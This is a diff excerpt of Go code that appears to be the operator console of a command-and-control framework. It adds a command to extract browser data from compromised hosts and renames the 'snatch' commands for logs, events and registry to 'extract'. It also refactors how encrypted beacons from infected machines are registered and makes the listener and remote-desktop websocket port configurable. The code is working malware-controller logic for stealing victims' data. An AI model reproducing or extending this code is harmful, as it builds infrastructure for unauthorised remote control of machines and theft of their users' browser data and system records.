-								key  := hostring_d.Key[index -1]
-								extractBrowsersData(addr, key)
-								
-							} else {
-								fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
-
-							}
-
-						} else {
-							fmt.Printf("%s>%s Usage: extract data [index]\n\n", redColor, endColor)
-
-						}
-
-					case "snatch":
 						if strings.HasPrefix(strings.ToLower(line_instru), "reg")  {
-							instructions = append(instructions, "snatchregs 1")
+							instructions = append(instructions, "extractregs 1")
 
 						} else if strings.HasPrefix(strings.ToLower(line_instru), "log") {
-							instructions = append(instructions, "snatchlogs 1")
+							instructions = append(instructions, "extractlogs 1")
 						
 						} else if strings.HasPrefix(strings.ToLower(line_instru), "event") {
-							instructions = append(instructions, "snatchevents 1")
+							instructions = append(instructions, "extractevents 1")
 
-						// } else if line_instru == "browser", "data" {
-						// 	extractBrowsersData()
+						} else if line_instru == "data" || line_instru == "browser" {
+							if len(line_splitted) == 3 {
+								if strings.HasPrefix(strings.ToLower(line_instru), "data") {
+									index, err := strconv.Atoi(line_splitted[2])
+									
+									if err != nil || index > len(hostring_d.Address) || 1 > index{
+										fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
+										continue
+	
+									}
+									
+									addr := hostring_d.Address[index  - 1]
+									key  := hostring_d.Key[index -1]
+									extractBrowsersData(addr, key)
+									
+								} else {
+									fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
+	
+								}
+	
+							} else {
+								fmt.Printf("%s>%s Usage: extract data [index]\n\n", redColor, endColor)
+	
+							}
 
 						} else {
 							fmt.Printf("%s>%s Invalid option %s%s%s\n", redColor, endColor, redColor, line_instru, endColor)
@@ -3020,7 +3133,7 @@ func main() {
 						}
 
 						if route == -1 {
-							fmt.Printf("%s>%s No agents responsible for %s%s%s skipping..\n", yellowColor, endColor, yellowColor, hstAddress, endColor)
+							fmt.Printf("%s>%s No agents responsible for %s%s%s! skipping..\n", yellowColor, endColor, yellowColor, hstAddress, endColor)
 							// / fmt.Println("A", hstAddress)
 
 						} else {
@@ -3099,7 +3212,7 @@ func main() {
 										}
 									}
 
-								} else if strings.HasPrefix(instructions[indx], "snatchlogs") {
+								} else if strings.HasPrefix(instructions[indx], "extractlogs") {
 									logsf, err := readFile("logs.json")
 									if err != nil {
 										logsf = []byte("{}")
@@ -3111,7 +3224,7 @@ func main() {
 									var outputLogs map[string][]string
 									err = json.Unmarshal([]byte(output), &outputLogs)
 									if err != nil {
-										log("snatchlogs - unmarshal output", "Error:" + err.Error())
+										log("extractlogs - unmarshal output", "Error:" + err.Error())
 										fmt.Println("error")
 									} else {
 										if _, ok := logs[strconv.Itoa(index + 1)]; !ok {
@@ -3129,7 +3242,7 @@ func main() {
 										fmt.Printf("\n%s>%s Logs have been %supdated%s\n\n", blueColor, endColor, blueColor, endColor)
 									}
 
-								} else if strings.HasPrefix(instructions[indx], "snatchevents") {
+								} else if strings.HasPrefix(instructions[indx], "extractevents") {
 									eventsf, err := readFile("events.json")
 									if err != nil {
 										eventsf = []byte("{}")
@@ -3141,30 +3254,59 @@ func main() {
 									var outputEvents map[string][]string
 									err = json.Unmarshal([]byte(output), &outputEvents)
 									if err != nil {
-										log("snatchlogs - unmarshal output", "Error:" + err.Error())
+										log("extractlogs - unmarshal output", "Error:" + err.Error())
 										fmt.Println("error")
+
 									} else {
 										if _, ok := events[strconv.Itoa(index + 1)]; !ok {
 											events[strconv.Itoa(index + 1)] = map[string][]string{}
+
 										}
+										
 										for _, outl := range outputEvents {
 											// fmt.Println("wat", logs, outl, index)
 											events[strconv.Itoa(index + 1)][strconv.Itoa(len(events[strconv.Itoa(index + 1)]) + 1)] = []string{outl[0], outl[1], outl[2]}
 											// logs.Logs[strconv.Itoa(index)][len(logs.Logs[strconv.Itoa(index)]) + 1] = []string{outl[0], outl[1], outl[2]}
+										
 										}
+										
 										f, _ := os.Create("events.json")
 										out, _ := json.MarshalIndent(events, "", "  ")
 										f.Write(out)
 										f.Close()
 										fmt.Printf("\n%s>%s Events have been %supdated%s\n\n", blueColor, endColor, blueColor, endColor)
+
 									}
+									
+								} else if strings.HasPrefix(instructions[indx], "extractregs") {
+									// fileChnType <- 0
+									var hstsSlice = []string{}
+
+									err := json.Unmarshal([]byte(strings.TrimSpace(strings.Replace(string(out), "<PiTrIaXMaGGi$N$9a1n>", "", -1))), &hstsSlice)
+									if err != nil {
+										fmt.Printf("\n%s>%s Error unmarshalling new hosts %s%s%s\n\n", redColor, endColor, redColor, err.Error(), endColor)
+									
+									} else {
+										for _, hst := range hstsSlice {
+											regHost(hst)
+											// fmt.Println(hst, err)
+
+										}
+
+									}
+									
+									// fmt.Println(strings.TrimSpace(strings.Replace(string(out), "<PiTrIaXMaGGi$N$9a1n>", "", -1)))
+									
 									
 								} else {
 									if strings.HasPrefix(instructions[indx], "upload")  {
 										fmt.Printf("\n%s%s >%s %s\n\n", blueColor, "upload " + strings.Split(instructions[indx], " ")[1], endColor, output)
+
 									} else {
 										fmt.Printf("\n%s%s >%s %s\n\n", blueColor, instructions[indx], endColor, output)
+
 									}
+
 								}
 
 								
@@ -3172,24 +3314,33 @@ func main() {
 						} else {
 							fmt.Printf("\n%s>%s Host %s%s%s is %soffline%s\n", redColor, endColor, redColor, hstAddress, endColor, redColor, endColor)
 							// fmt.Println(hstAddress, "is offline")
+							
 						}
+
 					}
+
 				}
+
 			}
+
 		}
+
 	}()
 
-	var antiddosCounter int = 0
 
 	go func(antiddosCounter *int) {
 		for {
 			if *antiddosCounter == 0 {
 				time.Sleep(1 * time.Second)
+
 			} else {
 				time.Sleep(5 * time.Second)
 				*antiddosCounter = *antiddosCounter - 5
+
 			}
+
 		}
+
 	}(&antiddosCounter)
 
 
@@ -3202,76 +3353,124 @@ func main() {
 		if req.Method == "GET" {
 			io.WriteString(writer, "0")
 			fmt.Printf("%sRegister_Handler >%s Got GET request. %v\n", yellowColor, endColor, req)
+
 		} else if req.Method == "POST" {
 			reqBody, _ := ioutil.ReadAll(req.Body)
-			if len(reqBody) > 0 && isASCII(string(reqBody)) {
-				dataSlice := strings.Split(string(reqBody), "|")
-				if len(dataSlice) == 3 { // register
-					// fmt.Println(antiddosCounter)
-					// os.Exit(1)
-					if antiddosCounter == 0 {
-						antiddosCounter = ddosCounter
-						// fmt.Println(dataSlice)
-						// temp_pem_decode, _ := pem.Decode([]byte(operPrivKey))
-						// operKeyProcessed, _ := x509.ParsePKCS1PrivateKey(temp_pem_decode.Bytes)
-						
-						aes_Key := RSA_OAEP_Decrypt(dataSlice[0], *operPrivKey)
-						temp_payload_1, _ := base64.StdEncoding.DecodeString(dataSlice[1])
-						temp_payload_2, _ := base64.StdEncoding.DecodeString(dataSlice[2])
 
-						payload, err := decrypt_AES(temp_payload_1, temp_payload_2, aes_Key)
-						// fmt.Println(string(payload), err)
-						if isASCII(string(payload)) {
-							var newHST t_HSTSingle
-							err = json.Unmarshal(payload, &newHST)
-							if err != nil {
-								fmt.Println("Failed to unmarshal json payload!", string(payload), err)
-								go log("Register_Handler", "Failed to unmarshal json payload: " + err.Error())
-
-								io.WriteString(writer, "0")
-							} else {
-								if basic_antiDDOS_check(&newHST) {
-									newHST.Key = base64.StdEncoding.EncodeToString(aes_Key)
-									hostRing_FileChn <- newHST
-									io.WriteString(writer, "1")
-								} else {
-									// fmt.Println("Failed basic_antiDDOS_check!")
-									go log("Register_Handler", "Failed basic_antiDDOS_check")
-								}
-							}
-						} else {
-							// fmt.Printf("%sRegister_Handler >%s Decrypted is not ASCII! %s\n", yellowColor, endColor, string(payload))
-							io.WriteString(writer, "0")
-							go log("Register_Handler", "Decrypted is not ASCII! " + string(payload))
-						}
-					} else {
-						fmt.Println("anti ddos caught something", antiddosCounter)
-						go log("Register_Handler", "Anti-DDos caught something: " + string(reqBody))
-						
-					}
-				
-				} else if len(dataSlice) == 2 { // instruction
-					fmt.Println("we got instruction wtf", dataSlice)
-
-				} else {
-					// fmt.Printf("%sRegister_Handler >%s Got POST request without DataSlice 3! %v %d\n", yellowColor, endColor, dataSlice, len(dataSlice))
-					io.WriteString(writer, "0")
-					go log("Register_Handler", "Got POST request without DataSlice 3: " + string(reqBody))
-
-				}
-			} else {
-				// fmt.Printf("\n%sRegister_Handler >%s Got POST request without valid data: %v %v\n", yellowColor, endColor, reqBody, string(reqBody))
-				io.WriteString(writer, "0")
-				go log("Register_Handler", "Got POST request without valid data")
-
+			result := regHost(string(reqBody))
+			if result {
+				io.WriteString(writer, "1")
+			
 			}
+
 		} else {
-			fmt.Println("Hello Fake", req.Method)
+			if debug {
+				fmt.Printf("%sRegister_Handler >%s Unknown request method: %s%s%s\n", yellowColor, endColor, yellowColor, req.Method, endColor)
+			
+			}
+
+			go log("Register_Handler", " Unknown request method: " + req.Method)
+
 		}
+
 	})
-	fmt.Println(http.ListenAndServe("127.0.0.1:1337", nil)) // make this dynamic later
+	
+	fmt.Println(http.ListenAndServe("127.0.0.1:" + operandport, nil)) // make this dynamic later
 }
 
+func regHost(reqBody string) bool {
+	if len(reqBody) > 0 && isASCII(reqBody) {
+		dataSlice := strings.Split(reqBody, "|")
+		if len(dataSlice) == 3 { // register
+			// fmt.Println(antiddosCounter)
+			// os.Exit(1)
+			if antiddosCounter == 0 {
+				antiddosCounter = ddosCounter
+				// fmt.Println(dataSlice)
+				// temp_pem_decode, _ := pem.Decode([]byte(operPrivKey))
+				// operKeyProcessed, _ := x509.ParsePKCS1PrivateKey(temp_pem_decode.Bytes)
+				
+				aes_Key := RSA_OAEP_Decrypt(dataSlice[0], *operPrivKey)
+				temp_payload_1, _ := base64.StdEncoding.DecodeString(dataSlice[1])
+				temp_payload_2, _ := base64.StdEncoding.DecodeString(dataSlice[2])
+
+				payload, err := decrypt_AES(temp_payload_1, temp_payload_2, aes_Key)
+				// fmt.Println(string(payload), err)
+				
+				if isASCII(string(payload)) {
+					var newHST t_HSTSingle
+					err = json.Unmarshal(payload, &newHST)
+					if err != nil {
+						
+						if debug {
+							fmt.Printf("%sRegister_Handler >%s Failed to unmarshal json payload: %s%s %s%s\n", yellowColor, endColor, yellowColor, string(payload), err.Error(), endColor)
+							// fmt.Println("Failed to unmarshal json payload!", string(payload), err)
+						
+						}
+
+						go log("Register_Handler", "Failed to unmarshal json payload: " + err.Error())
+
+					} else {
+
+						if basic_antiDDOS_check(&newHST) {
+							newHST.Key = base64.StdEncoding.EncodeToString(aes_Key)
+							// fileChnType <- 0
+							hostRing_FileChn <- newHST
+							return true
+
+						} else {
+							if debug {
+								fmt.Printf("%sRegister_Handler >%s Failed basic anti_DDos checks\n", yellowColor, endColor)
+							
+							}
+							// fmt.Println("Failed basic_antiDDOS_check!")
+							go log("Register_Handler", "Failed basic_antiDDOS_check")
+
+						}
+
+					}
+
+				} else {
+					if debug {
+						fmt.Printf("%sRegister_Handler >%s Decrypted is not ASCII!\n", yellowColor, endColor)
+					}
+
+					go log("Register_Handler", "Decrypted is not ASCII! " + string(payload))
+
+				}
+
+			} else {
+				if debug {
+					fmt.Printf("%sRegister_Handler >%s Anti-DDos caught odd behaviour: %v\n", yellowColor, endColor, antiddosCounter)
+					// fmt.Println("anti ddos caught something", antiddosCounter)
+				
+				}
+
+				go log("Register_Handler", "Anti-DDos caught something: " + reqBody)
+				
+			}
+		
+		} else if len(dataSlice) == 2 { // instruction
+			if debug {
+				fmt.Printf("%sRegister_Handler >%s Somebody trying to execute instructions on us like we were hosts WTF: %v\n", yellowColor, endColor, dataSlice)
+			}
+			go log("Register_Handler", "Somebody trying to execute instructions on us like we were hosts WTF: " + dataSlice[0] + " " + dataSlice[1])
+
+
+		} else {
+			// fmt.Printf("%sRegister_Handler >%s Got POST request without DataSlice 3! %v %d\n", yellowColor, endColor, dataSlice, len(dataSlice))
+			go log("Register_Handler", "Got POST request without DataSlice 3: " + reqBody)
+
+		}
+
+	} else {
+		// fmt.Printf("\n%sRegister_Handler >%s Got POST request without valid data: %v %v\n", yellowColor, endColor, reqBody, string(reqBody))
+		go log("Register_Handler", "Got POST request without valid data")
+
+	}
+
+	return false
+}
 
 func rdpfront(writer http.ResponseWriter, req *http.Request) {
 	// if req.Method == "GET" {
@@ -3286,7 +3485,7 @@ func rdpfront(writer http.ResponseWriter, req *http.Request) {
 		<script>
 			const twokey = "%s";
 			
-			conn = new WebSocket("ws://127.0.0.1:1337/"+ twokey + "rdp");
+			conn = new WebSocket("ws://127.0.0.1:%s/"+ twokey + "rdp");
 			conn.onclose = function (evt) {
 				alert("Lost connection to websocket");
 			};
@@ -3311,7 +3510,7 @@ func rdpfront(writer http.ResponseWriter, req *http.Request) {
 			};
 	
 		</script>
-	</html>`, twotimeKey))
+	</html>`, twotimeKey, operandport))
 	// fmt.Printf("%sRegister_Handler >%s Got GET request. %v\n", yellowColor, endColor, req)
 	// } else {
 	// 	fmt.Println("hello there", req.Method)
